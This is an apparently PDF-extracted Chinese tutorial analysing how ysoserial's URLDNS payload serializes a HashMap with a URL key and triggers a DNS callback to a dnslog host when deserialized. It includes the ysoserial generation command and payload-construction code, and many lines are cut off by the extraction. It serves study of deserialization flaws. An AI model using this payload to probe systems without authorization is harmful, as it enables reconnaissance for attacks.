反序列化之
Java ysoserial
模块分析 酒仙桥
URLDNS _
六号部队
- MdEditor
“ Java 反序列化之 ysoserial URLDNS 模
块分析
前⾔
Java 反序列化漏洞 利⽤时，总会使⽤到 ysoserial 这款
⼯具，安服仔⽤了很多，但是⼯具的原理却依旧不清不
楚，当了这么久的脚本仔，是时候当⼀波（实习）研究
仔，学习下这款⼯具各个 Payload 的原理了，下⾯我们
先从漏洞探测模块 URLDNS 这个 Payload 开始学起，
逐步衍⽣到漏洞利⽤模块。
为什么 URLDNS 模块会发送 DNSLOG 请求？
分析
下载 ysoserial 项⽬，打开 pom.xml，程序⼊⼝在
ysoserial.GeneratePayload
打开 GeneratePayload.java，找到 main ⽅法，代码如
下：
当我们使⽤ ysoserial 执⾏以下命令时：
java -jar .\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "h
⾸先 ysoserial 获取外⾯传⼊的参数，并赋值给对应的变
量。
inal String payloadType = args[0]; // URLDNS
final String command = args[1]; //http://lyxhh.dnslog.
接着执⾏ ，根据全
Utils.getPayloadClass("URLDNS");
限定类名 ，获取对应的
ysoserial.payloads.URLDNS
Class 类对象。
final ObjectPayload payload = payloadClass.newInstance
然后通过反射创建 Class 类对应的对象，⾛完这句代
码，URLDNS 对象创建完成。
final Object object = payload.getObject("http://lyxhh.
接着执⾏ URLDNS 对象中的 getObject ⽅法。
getObject ⽅法中：
URLStreamHandler handler = new SilentURLStreamHandler(
创建了 URLStreamHandler 对象，该对象的作⽤，后⾯
我们会详细说到。
接着：
HashMap ht = new HashMap();
创建了 HashMap 对象：
URL u = new URL(null, "http://lyxhh.dnslog.cn", handle
URL 对象：
ht.put(u, "http://lyxhh.dnslog.cn");
将 URL 对象作为 HashMap 中的 key，dnslog 地址为
值，存⼊ HashMap 中。
Reflections.setFieldValue(u, "hashCode", -1);
通过反射机制 设置 URL 对象的成员变量 hashCode 值
为 - 1，为什么要设置值为 - 1，这问题在反序列化时会
详细说到。
将 HashMap 对象返回 ，接着对 HashMap
return ht;
对象 进⾏序列化操作
Serializer.serialize(object,
并将序列化的结果重定向到 ⽂件
out); dnslog.ser
中。
由于 HashMap 中重写了 writeObject ⽅法，因此在进
⾏序列化操作时，执⾏的序列化⽅法是 HashMap 中的
writeObject ⽅法，具体如下：
先执⾏默认的序列化操作:
接着 遍历 HashMap，对 HashMap 中的 key，value 进
⾏序列化。
综上所述，梳理下 ysoserial payload，URLDNS 序列化
的整个过程：
⾸先 ysoserial 通过反射的⽅式，根据全限定类
名 ，获取对应的
ysoserial.payloads.URLDNS
Class 类对象，并通过 Class 类对象的
⽅法，获取 URLDNS 对象。
newInstance()
接着执⾏ URLDNS 对象中的 getObject ⽅法。
在 getObject ⽅法中，创建了
URLStreamHandler 对象
URLStreamHandler handler = new
，该对象会被
SilentURLStreamHandler();
URL 对象引⽤。
创建 HashMap 对象
HashMap ht = new
，URL 对象
HashMap(); URL u = new
URL(null, "http://lyxhh.dnslog.cn",
。
handler);
将 URL 对象作为 HashMap 中的 Key，
DNSLOG 的地址作为 HashMap 中的值
HashMap.put(u,
"http://lyxhh.dnslog.cn");
通过反射的⽅式
Reflections.setFieldValue(u,
，设置 URL 对象中的
"hashCode", -1);
成员变量 hashCode 值为 - 1。
返回 HashMap 对象。
然后对 HashMap 对象进⾏序列化操作
Serializer.serialize(HashMap object, out);
整个序列化过程中，有⼏个问题： 1、为什么要创建
URLStreamHandler 对象，URL 对象中默认的
URLStreamHandler 对象不⾹吗。 2、为什么要设置
URL 对象中的成员变量 hashCode 值为 - 1。
反序列化分析
读取上述操作⽣成的 ⽂件，执⾏反序列
dnslog.ser
化，触发 DNSLOG 请求:
为什么 HashMap 的反序列化过程会发送 DNSLOG 请求
呢？
在进⾏反序列化操作时，由于 HashMap 中重写了
readObject ⽅法，因此执⾏的反序列化⽅法是
HashMap 中的 readObject ⽅法，如下：
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
// Read in the threshold (ignored), loadfactor, an
s.defaultReadObject(); // 执⾏默认的反序列化⽅法
reinitialize(); //初始化变量值
if (loadFactor  0) { // (if zero, use defaults
// Size the table using given load factor only
// range of 0.25...4.0
float lf = Math.min(Math.max(0.25f, loadFactor
float fc = (float)mappings / lf + 1.0f;
int cap = ((fc = MAXIMUM_CAPACITY) ?
MAXIMUM_CAPACITY :
tableSizeFor((int)fc));
float ft = (float)cap * lf;
threshold = ((cap [] tab = (Node[])new Node[ca
table = tab;
// Read the keys and values, and put the mappi
for (int i = 0; i 
putVal(hash(key), key, value, false, true) -->
hash(key) -->
URL.hashCode() -->
URLStreamHandler.hashCode(this) -->
URLStreamHandler.getHostAddress(u) --> 发送DN
使⽤重写的 SilentURLStreamHandler。
URLStreamHandler handler = new SilentURLStreamHandler(
ht.put(new URL(null, url, handler), url); -->
putVal(hash(key), key, value, false, true) -->
hash(key) -->
URL.hashCode() -->
URLStreamHandler.hashCode(this) -->
SilentURLStreamHandler.getHostAddress(u) -->
transient URLStreamHandler handler;
由于 handler 的类型是 transient，被 transient 修饰的
变量在序列化时，不会被存储，因此不影响反序列化链的
触发。（反序列化时，handler 是默认的，没有将
getHostAddress ⽅法置空，依旧可以执⾏ DNSLOG 请
求）
SilentURLStreamHandler 重写的 openConnection 函
数，经过分析在 URLDNS 中并没有使⽤到，之所以存在
是因为 SilentURLStreamHandler 类继承
URLStreamHandler 抽象类，必须实现该抽象类中的所
有抽象⽅法。
⼩结： URLDNS 通过 URL 构造函数 传递
SilentURLStreamHandler 类对象，该类重写了
getHostAddress ⽅法，将⽅法体置为空实现，旨在执⾏
HashMap.put 时，不会触发 DNSLOG 请求，降低对⽬
标漏洞的误判率。
2、为什么要设置 URL 对象中的成员
变量 hashCode 值为 - 1。
在 URL 对象创建时，hashCode 值默认为 - 1。
接着进⾏了 HashMap.put 操作，计算 key hash 时，会
执⾏ URL.hashCode ⽅法。
执⾏完 ，会重置了 hashCode
handler.hashCode(this)
成员变量的值，此时该值就不为 - 1 了，这⾥我们通过
反射获取 的 hashCode 值，如下：
经过HashMap.put后
⽽ hashCode 变量没有被 transient 修饰，因此序列化
时会将 hashCode 变量值存储进序列化数据中。
在进⾏反序列化操作时，由于 hashCode 值不为 - 1，不
会执⾏ ，从⽽导致⽆法发送
handler.hashCode(this)
DNSLOG 请求。
因此在执⾏完 HashMap.put 后，需要反射将 hashCode
的值设置了 - 1，以便反序列化执⾏时，可以正常发送
DNSLOG 请求。
⽹上的分析⽂章，绝⼤部分都是分析如何触发
DNSLOG，但是关于 ysoserial 的其他细节构造却只字不
提。
总结
本⽂从⼯具的命令使⽤出发，由浅⼊深的分析了
URLDNS Payload 执⾏序列化的过程，以及反序列化时
是如何触发 DNSLOG 请求，接着分析了 ysoserial 构造
URLDNS Payload 的⼀些必要的细节，希望我的分析可
以给⼤家带来帮助，后续我们将继续从 ysoserial ⼯具学
习更多的反序列化知识。
全⽂完
本⽂由 简悦 SimpRead (http://ksria.com/simpread) 优化，⽤以
提升阅读体验
beta
使⽤了 全新的简悦词法分析引擎 ，点击查看
(http://ksria.com/simpread/docs/#/词法分析引擎)详细说明